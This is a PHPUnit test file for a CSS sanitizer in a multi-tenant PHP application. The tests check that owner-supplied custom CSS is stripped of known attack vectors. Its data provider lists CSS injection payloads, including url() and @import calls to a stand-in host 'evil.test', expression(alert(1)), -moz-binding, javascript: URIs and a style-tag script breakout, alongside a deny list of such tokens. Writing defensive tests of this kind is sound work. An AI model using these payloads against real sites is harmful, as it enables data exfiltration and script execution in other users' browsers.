<?php

declare(strict_types=1);

namespace Tests\Unit\Tenancy;

use App\Domain\Tenancy\Support\CssSanitizer;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

/**
 * custom_css is the one place an academy owner writes code that renders in
 * someone else's browser. Every payload below is a documented CSS exfiltration
 * or execution vector, so each one is a test rather than a code comment.
 *
 * @see docs/03-white-label.md §8 · docs/12-security-and-compliance.md §6
 */
final class CssSanitizerTest extends TestCase
{
    private CssSanitizer $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();

        $this->sanitizer = new CssSanitizer;
    }

    #[Test]
    public function it_keeps_ordinary_declarations(): void
    {
        $result = $this->sanitizer->sanitize('.brand-header { color: #1D4ED8; padding: 12px; }');

        $this->assertStringContainsString('color: #1D4ED8', $result['css']);
        $this->assertStringContainsString('padding: 12px', $result['css']);
        $this->assertSame([], $result['stripped']);
    }

    /**
     * @return array<string, array{string}>
     */
    public static function payloads(): array
    {
        return [
            'remote url' => ['.a { background: url(https://evil.test/x.png); }'],
            'data uri' => ['.a { background: url(data:image/svg+xml;base64,PHN2Zz4=); }'],
            'import' => ['@import url("https://evil.test/x.css"); .a { color: red; }'],
            'ie expression' => ['.a { width: expression(alert(1)); }'],
            'ie behavior' => ['.a { behavior: url(#default#time2); }'],
            'moz binding' => ['.a { -moz-binding: url(https://evil.test/x.xml#x); }'],
            'javascript uri' => ['.a { background: javascript:alert(1); }'],
            'comment obfuscation' => ['.a { background: ur/**/l(https://evil.test/x); }'],
            'markup injection' => ['.a { font-family: "</style><script>alert(1)</script>"; }'],
        ];
    }

    #[Test]
    #[DataProvider('payloads')]
    public function it_refuses_every_known_vector(string $css): void
    {
        $result = $this->sanitizer->sanitize($css);

        foreach (['url(', '@import', 'expression', 'behavior', 'binding', 'javascript:', '<script'] as $needle) {
            $this->assertStringNotContainsStringIgnoringCase(
                $needle,
                $result['css'],
                "Sanitised CSS still contains [{$needle}]."
            );
        }

        // The author is told what vanished; silent stripping reads as a bug.
        $this->assertNotSame([], $result['stripped']);
    }

    #[Test]
    public function a_rejected_declaration_does_not_take_its_neighbours_with_it(): void
    {
        $result = $this->sanitizer->sanitize(
            '.a { color: #fff; background: url(https://evil.test/x.png); padding: 4px; }'
        );

        $this->assertStringContainsString('color: #fff', $result['css']);
        $this->assertStringContainsString('padding: 4px', $result['css']);
        $this->assertStringNotContainsString('url(', $result['css']);
    }

    #[Test]
    public function empty_input_is_not_an_error(): void
    {
        $result = $this->sanitizer->sanitize('   ');

        $this->assertSame('', $result['css']);
        $this->assertSame([], $result['stripped']);
    }
}
